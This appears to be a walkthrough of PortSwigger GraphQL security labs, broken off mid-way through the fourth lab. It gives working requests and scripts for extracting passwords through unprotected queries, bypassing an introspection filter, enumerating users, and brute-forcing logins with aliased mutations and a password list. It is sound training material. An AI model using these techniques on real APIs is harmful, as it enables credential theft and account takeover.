# GraphQL API Vulnerabilities - Complete PortSwigger Labs Guide

## Table of Contents

1. [Lab 1: Accessing Private GraphQL Posts](#lab-1-accessing-private-graphql-posts)
2. [Lab 2: Accidental Exposure of Private GraphQL Fields](#lab-2-accidental-exposure-of-private-graphql-fields)
3. [Lab 3: Finding a Hidden GraphQL Endpoint](#lab-3-finding-a-hidden-graphql-endpoint)
4. [Lab 4: Bypassing GraphQL Brute Force Protections](#lab-4-bypassing-graphql-brute-force-protections)
5. [Lab 5: Performing CSRF Exploits over GraphQL](#lab-5-performing-csrf-exploits-over-graphql)
6. [Common Mistakes & Troubleshooting](#common-mistakes--troubleshooting)
7. [Real-World Application](#real-world-application)

---

## Lab 1: Accessing Private GraphQL Posts

### Lab Information
- **Difficulty**: Apprentice
- **Topic**: GraphQL API vulnerabilities - Information Disclosure
- **Objective**: Find the hidden blog post and enter the password

### Vulnerability Description

This lab demonstrates improper access controls in GraphQL APIs where sensitive data can be accessed through direct queries despite not being exposed through the normal application interface. The vulnerability exploits:

1. **Sequential ID enumeration**: Blog posts use predictable integer IDs
2. **Missing access control**: Hidden posts can be queried directly via GraphQL
3. **Schema introspection**: The API reveals sensitive fields that shouldn't be accessible

### Step-by-Step Solution

#### Phase 1: Reconnaissance

1. **Access the lab** in Burp's browser
2. Navigate to the blog page and observe the posts
3. Open **Burp Suite > Proxy > HTTP history**
4. Look for GraphQL requests to `/graphql/v1`

**Example Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/json

{
  "query": "query getBlogPosts { getAllBlogPosts { id, title, summary, image } }"
}
```

**Example Response:**
```json
{
  "data": {
    "getAllBlogPosts": [
      {"id": 1, "title": "First post", "summary": "...", "image": "/image/blog/posts/1.jpg"},
      {"id": 2, "title": "Second post", "summary": "...", "image": "/image/blog/posts/2.jpg"},
      {"id": 4, "title": "Fourth post", "summary": "...", "image": "/image/blog/posts/4.jpg"}
    ]
  }
}
```

**Key Observation**: Notice that post ID 3 is missing from the results, indicating a hidden post.

#### Phase 2: Schema Introspection

1. **Send the GraphQL request to Repeater**
2. Right-click in the request pane
3. Select **GraphQL > Set introspection query**

**Introspection Query:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}
```

4. **Send the request** and review the response
5. Look for the `BlogPost` type definition
6. **Key Finding**: The `BlogPost` type includes a `postPassword` field

**Schema Fragment:**
```json
{
  "name": "BlogPost",
  "fields": [
    {"name": "id", "type": {"name": "Int"}},
    {"name": "title", "type": {"name": "String"}},
    {"name": "summary", "type": {"name": "String"}},
    {"name": "postPassword", "type": {"name": "String"}},
    {"name": "image", "type": {"name": "String"}}
  ]
}
```

#### Phase 3: Exploitation

1. Return to the original GraphQL request in Repeater
2. Click on the **GraphQL** tab (next to "Request" and "Response")
3. In the Query panel, modify the query to target ID 3 and include `postPassword`:

**Exploitation Query:**
```graphql
query {
  getBlogPost(id: 3) {
    id
    title
    summary
    postPassword
    image
  }
}
```

**Alternative using variables:**
```json
{
  "query": "query getBlogPost($id: Int!) { getBlogPost(id: $id) { id title summary postPassword image } }",
  "variables": {"id": 3}
}
```

4. **Send the request**

**Successful Response:**
```json
{
  "data": {
    "getBlogPost": {
      "id": 3,
      "title": "Secret post",
      "summary": "This is a hidden post",
      "postPassword": "g0d8rv4yscdlkb3fqoxa",
      "image": "/image/blog/posts/3.jpg"
    }
  }
}
```

5. **Copy the password** from the `postPassword` field
6. Return to the lab page in your browser
7. If prompted, enter the password in the submission dialog
8. Alternatively, refresh the page - a password submission field should appear
9. **Submit the password** to solve the lab

### Burp Suite Features Used

1. **Proxy > HTTP history**: Traffic analysis and request identification
2. **Repeater**: Manual request modification and testing
3. **GraphQL tab**: Query and variable manipulation with syntax highlighting
4. **Introspection query insertion**: Automated schema discovery via context menu

### HTTP Request/Response Examples

**Full Exploitation Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a5f00eb04d0c5eb804b0fc600020031.web-security-academy.net
Content-Type: application/json
Content-Length: 115

{"query":"query{getBlogPost(id:3){id title summary postPassword image}}"}
```

**Full Successful Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 198

{"data":{"getBlogPost":{"id":3,"title":"Secret admin panel access","summary":"Hidden post with secret password","postPassword":"g0d8rv4yscdlkb3fqoxa","image":"/image/blog/posts/3.jpg"}}}
```

### Attack Variations

1. **Enumerate all posts** by iterating through IDs:
```graphql
query {
  post1: getBlogPost(id: 1) { postPassword }
  post2: getBlogPost(id: 2) { postPassword }
  post3: getBlogPost(id: 3) { postPassword }
  post4: getBlogPost(id: 4) { postPassword }
  post5: getBlogPost(id: 5) { postPassword }
}
```

2. **Use aliases** to batch query multiple posts in one request
3. **Explore other hidden fields** via introspection that might contain sensitive data

### Common Mistakes

1. **Not noticing the missing ID**: Always look for gaps in sequential identifiers
2. **Forgetting to check the schema**: Introspection often reveals more fields than the UI shows
3. **Using the wrong query name**: Make sure to use `getBlogPost` (singular) not `getAllBlogPosts`
4. **Not including the GraphQL content-type**: Ensure `Content-Type: application/json`

### Troubleshooting

**Problem**: Introspection is disabled
- **Solution**: This lab has introspection enabled; if disabled, try field suggestion attacks or use Clairvoyance

**Problem**: Query returns null
- **Solution**: Verify the ID is correct and the field name matches the schema exactly

**Problem**: Password submission doesn't work
- **Solution**: Refresh the page to see the password submission dialog

### Key Insights

This vulnerability demonstrates:
- **IDOR via GraphQL**: Direct object reference through ID parameters
- **Information disclosure**: Sensitive fields exposed through API
- **Insufficient access control**: No validation that the user should access hidden posts
- **Schema exposure**: Introspection revealing more than intended

---

## Lab 2: Accidental Exposure of Private GraphQL Fields

### Lab Information
- **Difficulty**: Apprentice
- **Topic**: GraphQL API vulnerabilities - Broken Access Control
- **Objective**: Sign in as the administrator and delete the username `carlos`

### Vulnerability Description

This lab features a **critical access control vulnerability** where the GraphQL API exposes sensitive credential fields (username and password) through a `getUser` query. The vulnerability chain:

1. User management functions powered by GraphQL
2. The `getUser` query returns username AND password fields
3. No authentication required to query user data
4. Sequential ID enumeration allows accessing any user
5. Administrator account uses predictable ID (id: 1)

### Step-by-Step Solution

#### Phase 1: Initial Reconnaissance

1. **Access the lab** and navigate to **My account**
2. **Attempt login** with test credentials (e.g., `test:test`)
3. Open **Burp Suite > Proxy > HTTP history**
4. Locate the login request - it should be a GraphQL mutation

**Login Mutation Example:**
```http
POST /graphql/v1 HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/json

{
  "query": "mutation login($input: LoginInput!) { login(input: $input) { token success } }",
  "variables": {
    "input": {
      "username": "wiener",
      "password": "peter"
    }
  }
}
```

#### Phase 2: Schema Discovery via Introspection

1. **Send the GraphQL request to Repeater**
2. Right-click in the Request pane
3. Select **GraphQL > Set introspection query**
4. **Send the introspection query**
5. Right-click the response
6. Select **GraphQL > Save GraphQL queries to site map**
7. Navigate to **Target > Site map**
8. Expand the GraphQL endpoint to see saved queries

**What to Look For:**
- A `getUser` query accepting an `id` parameter
- Fields returned by `getUser`, particularly `username` and `password`
- Other user-related queries or mutations

**Schema Fragment (from introspection):**
```json
{
  "name": "Query",
  "fields": [
    {
      "name": "getUser",
      "args": [
        {"name": "id", "type": {"name": "Int", "kind": "SCALAR"}}
      ],
      "type": {
        "name": "User",
        "kind": "OBJECT"
      }
    }
  ]
}
```

```json
{
  "name": "User",
  "fields": [
    {"name": "id", "type": {"name": "Int"}},
    {"name": "username", "type": {"name": "String"}},
    {"name": "password", "type": {"name": "String"}}
  ]
}
```

#### Phase 3: Extract Administrator Credentials

1. **Locate the `getUser` query** in the Site map
2. **Send it to Repeater**
3. Modify the query to target the administrator (typically id: 1)

**Exploitation Query:**
```graphql
query {
  getUser(id: 1) {
    id
    username
    password
  }
}
```

**Full HTTP Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a1d00a103f12c6881dd2f9c00e10062.web-security-academy.net
Content-Type: application/json
Content-Length: 72

{"query":"query{getUser(id:1){id username password}}"}
```

4. **Send the request**

**Successful Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "9fjofk50jzd1s7b2a9ck"
    }
  }
}
```

5. **Copy the credentials**:
   - Username: `administrator`
   - Password: `9fjofk50jzd1s7b2a9ck` (example - will vary per lab instance)

#### Phase 4: Authenticate and Delete Carlos

1. **Log out** if currently logged in
2. Navigate to **My account**
3. **Log in** with the administrator credentials
4. You should now have access to the **Admin panel**
5. Navigate to the admin panel (typically `/admin` or linked from the UI)
6. **Delete the user carlos** using the admin interface
7. **Lab solved!**

### Burp Suite Features Used

1. **Proxy > HTTP history**: Request interception and analysis
2. **Repeater**: Query modification and testing
3. **GraphQL > Set introspection query**: Automated schema discovery
4. **GraphQL > Save GraphQL queries to site map**: Organized schema viewing
5. **Target > Site map**: Browsing discovered GraphQL operations
6. **GraphQL tab**: Syntax-highlighted query editor

### Attack Variations

#### 1. Enumerate All Users

```graphql
query {
  user1: getUser(id: 1) { username password }
  user2: getUser(id: 2) { username password }
  user3: getUser(id: 3) { username password }
  user4: getUser(id: 4) { username password }
  user5: getUser(id: 5) { username password }
}
```

Use GraphQL aliases to query multiple users in a single request.

#### 2. Automated Enumeration Script

```python
import requests

url = "https://[LAB-ID].web-security-academy.net/graphql/v1"
headers = {"Content-Type": "application/json"}

for user_id in range(1, 11):
    query = {
        "query": f"query{{getUser(id:{user_id}){{id username password}}}}"
    }
    response = requests.post(url, json=query, headers=headers)
    data = response.json()

    if "data" in data and data["data"]["getUser"]:
        user = data["data"]["getUser"]
        print(f"ID {user['id']}: {user['username']} : {user['password']}")
```

#### 3. Using Burp Intruder

1. Send the `getUser` request to **Intruder**
2. Set the payload position on the `id` parameter:
   ```
   {"query":"query{getUser(id:§1§){username password}}"}
   ```
3. Configure payload:
   - **Payload type**: Numbers
   - **From**: 1
   - **To**: 100
   - **Step**: 1
4. **Start attack**
5. Review results for successful user retrievals

### Common Mistakes

1. **Not checking introspection**: Always run introspection to discover available queries
2. **Assuming admin ID is not 1**: By convention, the first user (id: 1) is often the administrator
3. **Missing the password field**: Ensure you specifically request the `password` field in your query
4. **Not saving queries to site map**: This makes schema navigation much easier
5. **Trying to delete carlos via GraphQL**: Use the web UI admin panel instead

### Troubleshooting

**Problem**: Introspection query fails
- **Solution**: Try with and without authentication; some endpoints require valid session cookies

**Problem**: getUser returns null
- **Solution**: Try different IDs; the admin might be id: 0 or another value

**Problem**: Password field not returned
- **Solution**: Ensure you explicitly request it: `getUser(id: 1) { password }`

**Problem**: Can't find admin panel after login
- **Solution**: Try navigating to `/admin`, `/administrator`, or look for links in the UI

**Problem**: Delete action doesn't work
- **Solution**: Ensure you're logged in as administrator and have valid session cookies

### Real-World Exploitation Scenarios

This vulnerability type has been found in:

1. **User management APIs**: Exposing PII, credentials, or sensitive user data
2. **E-commerce platforms**: Revealing customer addresses, payment methods, order history
3. **Social media applications**: Accessing private messages, email addresses, phone numbers
4. **SaaS platforms**: Leaking API keys, service credentials, configuration data

### HTTP Request/Response Examples

**Complete Introspection Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a1d00a103f12c6881dd2f9c00e10062.web-security-academy.net
Content-Type: application/json
Content-Length: 1456

{"query":"{\n  __schema {\n    queryType { name }\n    mutationType { name }\n    types {\n      ...FullType\n    }\n  }\n}\n\nfragment FullType on __Type {\n  kind\n  name\n  fields(includeDeprecated: true) {\n    name\n    args {\n      ...InputValue\n    }\n    type {\n      ...TypeRef\n    }\n  }\n}\n\nfragment InputValue on __InputValue {\n  name\n  type { ...TypeRef }\n}\n\nfragment TypeRef on __Type {\n  kind\n  name\n  ofType {\n    kind\n    name\n    ofType {\n      kind\n      name\n      ofType {\n        kind\n        name\n        ofType {\n          kind\n          name\n          ofType {\n            kind\n            name\n          }\n        }\n      }\n    }\n  }\n}"}
```

**Exploitation Request (formatted):**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a1d00a103f12c6881dd2f9c00e10062.web-security-academy.net
Content-Type: application/json
Cookie: session=abcdef123456

{
  "query": "query { getUser(id: 1) { id username password } }"
}
```

**Successful Credential Extraction:**
```json
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "9fjofk50jzd1s7b2a9ck"
    }
  }
}
```

### Key Insights

This lab demonstrates several critical security issues:

1. **IDOR (Insecure Direct Object Reference)**: Users accessible via predictable IDs
2. **Broken Access Control**: No authentication/authorization checks on sensitive queries
3. **Excessive Data Exposure**: API returns more fields than necessary (especially passwords)
4. **Information Disclosure**: Credentials stored and transmitted in plaintext
5. **Schema Design Flaw**: Password field should never be queryable

**OWASP Top 10 Mappings:**
- **A01:2021 - Broken Access Control**
- **A03:2021 - Injection** (GraphQL query manipulation)
- **A04:2021 - Insecure Design** (exposing password in API)

---

## Lab 3: Finding a Hidden GraphQL Endpoint

### Lab Information
- **Difficulty**: Practitioner
- **Topic**: GraphQL API vulnerabilities - Endpoint Discovery & Introspection Bypass
- **Objective**: Find the hidden endpoint and delete carlos

### Vulnerability Description

This lab combines multiple security weaknesses:

1. **Hidden GraphQL endpoint**: Not discoverable through normal site navigation
2. **Introspection defenses**: Simple filter that blocks `__schema{` patterns
3. **Bypass via whitespace injection**: Filter doesn't account for newlines or spaces
4. **Universal query for discovery**: The `__typename` query works on all GraphQL endpoints
5. **GET method support**: Allows query string injection for exploitation

### Step-by-Step Solution

#### Phase 1: Endpoint Discovery

GraphQL endpoints can be located at various paths. Common locations include:

```
/graphql
/api
/api/graphql
/graphql/api
/v1/graphql
/graph
/query
```

1. **Open Burp Suite > Repeater**
2. **Create a new request** targeting potential GraphQL endpoints
3. **Test common paths** with a universal GraphQL query

**Discovery Request (fails):**
```http
GET /api HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**Response:**
```http
HTTP/1.1 400 Bad Request
Content-Type: application/json

{"errors":[{"message":"Query not present"}]}
```

✓ **Success indicator**: "Query not present" error confirms this is a GraphQL endpoint!

4. **Verify with a universal query**:

```http
GET /api?query=query{__typename} HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"data":{"__typename":"query"}}
```

✓ **Confirmed**: `/api` is the GraphQL endpoint!

#### Phase 2: Bypassing Introspection Defenses

1. **Attempt standard introspection**:

**Request:**
```http
GET /api?query={__schema{types{name}}} HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**Response:**
```http
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"errors":[{"message":"Introspection query is not allowed"}]}
```

✗ **Blocked**: The endpoint filters introspection queries.

2. **Analyze the filter**: The filter likely looks for the pattern `__schema{`

3. **Bypass with newline injection**: Insert a newline character (`%0A`) after `__schema`

**Introspection Bypass Request:**
```http
GET /api?query={__schema%0A{types{name,fields{name,args{name,type{name,kind,ofType{name,kind}}}}}}} HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

Alternative with spaces:
```http
GET /api?query={__schema%20{types{name}}} HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**Successful Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Query",
          "fields": [
            {
              "name": "getUser",
              "args": [{"name": "id", "type": {"name": "Int"}}]
            },
            {
              "name": "getBlogPost",
              "args": [{"name": "id", "type": {"name": "Int"}}]
            }
          ]
        },
        {
          "name": "Mutation",
          "fields": [
            {
              "name": "deleteOrganizationUser",
              "args": [
                {
                  "name": "input",
                  "type": {
                    "name": "DeleteOrganizationUserInput",
                    "kind": "INPUT_OBJECT"
                  }
                }
              ]
            }
          ]
        }
      ]
    }
  }
}
```

4. **Key findings from schema**:
   - `getUser(id: Int)` query exists
   - `deleteOrganizationUser(input: DeleteOrganizationUserInput)` mutation exists
   - Need to find carlos's user ID

#### Phase 3: Identify Target User

1. **Query for carlos**:

```http
GET /api?query=query{getUser(id:3){id,username}} HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**Why ID 3?** Common convention:
- id: 1 = administrator
- id: 2 = wiener (your test account)
- id: 3 = carlos

**Response:**
```json
{
  "data": {
    "getUser": {
      "id": 3,
      "username": "carlos"
    }
  }
}
```

✓ **Confirmed**: Carlos has ID 3

#### Phase 4: Execute Deletion

From the schema, the deletion mutation requires an `input` object with an `id` field:

**Deletion Mutation:**
```http
GET /api?query=mutation{deleteOrganizationUser(input:{id:3}){user{id,username}}} HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**URL-encoded version:**
```http
GET /api?query=mutation%7BdeleteOrganizationUser(input%3A%7Bid%3A3%7D)%7Buser%7Bid%7D%7D%7D HTTP/1.1
Host: [LAB-ID].web-security-academy.net
```

**Successful Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "data": {
    "deleteOrganizationUser": {
      "user": {
        "id": 3,
        "username": "carlos"
      }
    }
  }
}
```

✓ **Lab solved!**

### Burp Suite Features Used

1. **Repeater**: Manual request crafting and testing
2. **Decoder**: URL encoding for query parameters
3. **GraphQL tab**: Query visualization (works after discovering endpoint)
4. **Target > Site map**: Saving discovered queries

### Introspection Bypass Techniques

#### 1. Whitespace Injection

```graphql
{
  __schema
  {types{name}}
}
```

URL-encoded: `%7B__schema%0A%7Btypes%7Bname%7D%7D%7D`

#### 2. Space Injection

```graphql
{__schema {types{name}}}
```

URL-encoded: `%7B__schema%20%7Btypes%7Bname%7D%7D%7D`

#### 3. Comment Injection

```graphql
{__schema# comment here
{types{name}}}
```

#### 4. Tab Character

```graphql
{__schema	{types{name}}}
```

URL-encoded tab: `%09`

#### 5. Alternative HTTP Methods

Some endpoints allow introspection via different methods:

```http
POST /api HTTP/1.1
Content-Type: application/x-www-form-urlencoded

query={__schema{types{name}}}
```

### Attack Variations

#### 1. Automated Endpoint Discovery

**Python Script:**
```python
import requests

base_url = "https://LAB-ID.web-security-academy.net"
paths = [
    "/graphql", "/api", "/api/graphql", "/graphql/api",
    "/v1/graphql", "/graph", "/query", "/gql"
]

for path in paths:
    try:
        response = requests.get(
            f"{base_url}{path}?query={{__typename}}",
            timeout=5
        )
        if "__typename" in response.text:
            print(f"[+] GraphQL endpoint found: {path}")
            print(f"    Response: {response.text}")
    except:
        pass
```

#### 2. Using Clairvoyance for Schema Recovery

If introspection is completely disabled:

```bash
# Install Clairvoyance
pip install clairvoyance

# Reconstruct schema
clairvoyance -o schema.json -w wordlist.txt https://target.com/api
```

#### 3. Field Suggestion Exploitation

Apollo Server provides helpful error messages:

**Request:**
```graphql
query {
  getUs
}
```

**Response:**
```json
{
  "errors": [{
    "message": "Cannot query field 'getUs' on type 'Query'. Did you mean 'getUser', 'getUsers'?"
  }]
}
```

Use suggestions to reconstruct the schema.

### Common Mistakes

1. **Not trying common endpoint paths**: Always test `/api`, `/graphql`, `/api/graphql`
2. **Giving up after introspection is blocked**: Try whitespace/encoding bypasses
3. **Forgetting to URL-encode**: GET parameters must be properly encoded
4. **Not identifying carlos's ID**: Use sequential enumeration or field discovery
5. **Malformed mutation syntax**: Ensure proper GraphQL mutation structure

### Troubleshooting

**Problem**: Can't find the endpoint
- **Solution**: Try these paths systematically: `/api`, `/graphql`, `/api/graphql`, `/v1/graphql`, `/graph`

**Problem**: Introspection bypass doesn't work
- **Solution**: Try multiple whitespace characters: `%0A` (newline), `%20` (space), `%09` (tab), `%0D` (carriage return)

**Problem**: Deletion mutation fails
- **Solution**: Verify the exact input structure from the schema; it might require `{input: {id: 3}}` or just `{id: 3}`

**Problem**: "User not found" error
- **Solution**: Enumerate IDs from 1-10 to find carlos

### HTTP Request/Response Examples

**Complete Introspection Bypass Request:**
```http
GET /api?query=%7B__schema%0A%7Btypes%7Bname%2Cfields%7Bname%2Cargs%7Bname%2Ctype%7Bname%2Ckind%7D%7D%7D%7D%7D%7D HTTP/1.1
Host: 0a8d006504d5b2b281ae5e2c00f90031.web-security-academy.net
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

**Decoded Query:**
```graphql
{
  __schema
  {
    types {
      name,
      fields {
        name,
        args {
          name,
          type {
            name,
            kind
          }
        }
      }
    }
  }
}
```

**User Enumeration Request:**
```http
GET /api?query=query%7BgetUser(id%3A3)%7Bid%2Cusername%7D%7D HTTP/1.1
Host: 0a8d006504d5b2b281ae5e2c00f90031.web-security-academy.net
```

**Final Deletion Request:**
```http
GET /api?query=mutation%7BdeleteOrganizationUser(input%3A%7Bid%3A3%7D)%7Buser%7Bid%7D%7D%7D HTTP/1.1
Host: 0a8d006504d5b2b281ae5e2c00f90031.web-security-academy.net
Cookie: session=YourSessionCookie
```

### Key Insights

This lab teaches multiple critical concepts:

1. **Security through obscurity fails**: Hidden endpoints can be discovered
2. **Simple filters are ineffective**: Whitespace bypasses are trivial
3. **GET method risks**: Query parameters in URLs make exploitation easier
4. **Schema discovery is powerful**: Even partial schema information enables attacks
5. **Defense in depth required**: Multiple security layers needed

---

## Lab 4: Bypassing GraphQL Brute Force Protections

### Lab Information
- **Difficulty**: Practitioner
- **Topic**: GraphQL API vulnerabilities - Rate Limiting Bypass
- **Objective**: Brute force the login mechanism to sign in as carlos

### Vulnerability Description

This lab demonstrates how GraphQL **aliases** can bypass rate limiting protections. The vulnerability chain:

1. Login mechanism powered by GraphQL mutation
2. Rate limiter blocks multiple sequential requests from same origin
3. **GraphQL aliases** allow batching 100+ login attempts in a single HTTP request
4. Rate limiter only counts HTTP requests, not individual GraphQL operations
5. Successful authentication returns `success: true` in response

**Test Credentials**:
- Username: `carlos`
- Password: One from the provided authentication lab password list

### Step-by-Step Solution

#### Phase 1: Understanding the Login Mechanism

1. **Access the lab** and navigate to **My account**
2. **Attempt login** with test credentials (e.g., `carlos:password`)
3. Open **Burp Suite > Proxy > HTTP history**
4. Locate the login GraphQL mutation

**Login Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: [LAB-ID].web-security-academy.net
Content-Type: application/json

{
  "query": "mutation login($input: LoginInput!) { login(input: $input) { token success } }",
  "variables": {
    "input": {
      "username": "carlos",
      "password": "invalid"
    }
  }
}
```

**Failed Login Response:**
```json
{
  "data": {
    "login": {
      "token": null,
      "success": false
    }
  }
}
```

#### Phase 2: Test Rate Limiting

1. **Send the login request to Repeater**
2. **Send multiple requests rapidly** (10-20 times)
3. Observe the rate limit error

**Rate Limit Response:**
```http
HTTP/1.1 429 Too Many Requests
Content-Type: application/json

{
  "errors": [{
    "message": "Too many login attempts. Please try again later."
  }]
}
```

**Key Finding**: The rate limiter blocks based on HTTP request count, not GraphQL operation count.

#### Phase 3: Craft Aliased Brute Force Request

GraphQL aliases allow you to run multiple operations in a single request:

```graphql
mutation {
  attempt1: login(input: {username: "carlos", password: "123456"}) {
    token
    success
  }
  attempt2: login(input: {username: "carlos", password: "password"}) {
    token
    success
  }
  attempt3: login(input: {username: "carlos", password: "12345678"}) {
    token
    success
  }
  # ... continue for all passwords
}
```

**PortSwigger Academy Password List** (common candidates):
```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
```

#### Phase 4: Build the Attack Payload

**JavaScript Helper Script:**
```javascript
// Password list
const passwords = `123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow`.split('\n');

// Generate aliased mutation
let mutation = 'mutation {\n';
passwords.forEach((password, index) => {
  mutation += `  bruteforce${index}: login(input: {username: "carlos", password: "${password.trim()}"}) {\n`;
  mutation += `    token\n`;
  mutation += `    success\n`;
  mutation += `  }\n`;
});
mutation += '}';

console.log(mutation);
```

**Alternatively, create the payload manually** or use a text editor with find/replace.

#### Phase 5: Execute the Attack

1. **Copy the generated mutation** to your clipboard
2. In **Burp Suite Repeater**, replace the query with your aliased mutation:

**Attack Request:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a5d00f10390b7ca825b3fb800d00010.web-security-academy.net
Content-Type: application/json
Content-Length: [LARGE_NUMBER]

{
  "query": "mutation { bruteforce0: login(input: {username: \"carlos\", password: \"123456\"}) { token success } bruteforce1: login(input: {username: \"carlos\", password: \"password\"}) { token success } bruteforce2: login(input: {username: \"carlos\", password: \"12345678\"}) { token success } ... [CONTINUE FOR ALL PASSWORDS] }"
}
```

**Important**: Remove `operationName` and `variables` fields if present - they're not needed for this attack.

3. **Send the request**

#### Phase 6: Identify Successful Password

1. **Search the response** for `"success": true`
2. Use Burp's search function (Ctrl+F / Cmd+F)
3. Look for the alias with `success: true`

**Successful Response Fragment:**
```json
{
  "data": {
    "bruteforce0": {"token": null, "success": false},
    "bruteforce1": {"token": null, "success": false},
    ...
    "bruteforce42": {
      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "success": true
    },
    ...
  }
}
```

4. **Map the alias back to the password**:
   - `bruteforce42` means the 43rd password in the list (0-indexed)
   - Check your list: password at index 42 is the correct one

5. **Log in with the discovered credentials**:
   - Username: `carlos`
   - Password: [discovered password]

✓ **Lab solved!**

### Burp Suite Features Used

1. **Proxy > HTTP history**: Identify the login mutation structure
2. **Repeater**: Craft and test the aliased brute force payload
3. **Search function**: Quickly find `success: true` in large responses
4. **GraphQL tab**: Optional - visualize the query structure

### Attack Optimization Techniques

#### 1. Automated Response Analysis

**Python Script:**
```python
import json
import re

# Paste the response body here
response = '''{"data":{"bruteforce0":{"token":null,"success":false},...}}'''

data = json.loads(response)
for alias, result in data['data'].items():
    if result['success']:
        # Extract index from alias (e.g., "bruteforce42" -> 42)
        index = int(re.search(r'\d+', alias).group())
        print(f"[+] Success at index {index}")
        print(f"[+] Alias: {alias}")
        print(f"[+] Token: {result['token']}")
```

#### 2. Smaller Batch Sizes

If the server has payload size limits, split into multiple requests:

```graphql
# Batch 1: Passwords 0-49
mutation {
  bruteforce0: login(input: {username: "carlos", password: "123456"}) { success }
  # ... passwords 1-49
}

# Batch 2: Passwords 50-99
mutation {
  bruteforce50: login(input: {username: "carlos", password: "password50"}) { success }
  # ... passwords 51-99
}
```

#### 3. Burp Intruder Alternative (Less Efficient)

If aliases don't work for some reason:

1. Send login request to **Intruder**
2. Set payload position: `"password": "§password§"`
3. Load password list
4. Configure **Resource Pool** to limit concurrent requests
5. Attack, but expect rate limiting

### Common Mistakes

1. **Including variables in the aliased request**: Remove the `variables` field entirely
2. **Not removing operationName**: This can cause parsing errors
3. **Incorrect alias syntax**: Each alias must have a unique name (bruteforce0, bruteforce1, etc.)
4. **Case sensitivity**: Ensure username is exactly "carlos" (lowercase)
5. **Missing password in mapping**: Keep your password list indexed to map aliases correctly
6. **Forgetting to check ALL success fields**: Don't stop at the first `false`

### Troubleshooting

**Problem**: Request is too large (413 Payload Too Large)
- **Solution**: Split into multiple batches of 50-100 passwords each

**Problem**: GraphQL syntax error
- **Solution**: Validate your mutation structure; ensure all braces are closed and aliases are unique

**Problem**: Still getting rate limited
- **Solution**: Ensure you're using aliases in a **single HTTP request**, not separate requests

**Problem**: Can't find which password succeeded
- **Solution**: Use Burp's search function (Ctrl+F) to find `"success":true` with no space

**Problem**: Found success but can't determine password
- **Solution**: Count the alias index (bruteforce42 = password at index 42 in your list)

### Real-World Impact

Rate limiting bypass via GraphQL batching has been exploited in:

1. **Authentication endpoints**: Brute forcing user credentials
2. **2FA/OTP verification**: Bypassing PIN rate limits
3. **API key validation**: Testing leaked API keys at scale
4. **Discount code testing**: E-commerce coupon brute forcing
5. **Invitation code guessing**: Bypassing access controls

**Bug Bounty Examples:**
- GitHub GraphQL API: $2,500 bounty for rate limit bypass
- Facebook GraphQL: Multiple findings for batched operation abuse
- Shopify GraphQL: Account takeover via brute force bypass

### HTTP Request/Response Examples

**Complete Attack Request (abbreviated):**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a5d00f10390b7ca825b3fb800d00010.web-security-academy.net
Content-Type: application/json
Cookie: session=abc123
Content-Length: 15423

{"query":"mutation{bruteforce0:login(input:{username:\"carlos\",password:\"123456\"}){token success}bruteforce1:login(input:{username:\"carlos\",password:\"password\"}){token success}bruteforce2:login(input:{username:\"carlos\",password:\"12345678\"}){token success}bruteforce3:login(input:{username:\"carlos\",password:\"qwerty\"}){token success}..."}
```

**Successful Response (abbreviated):**
```http
HTTP/1.1 200 OK
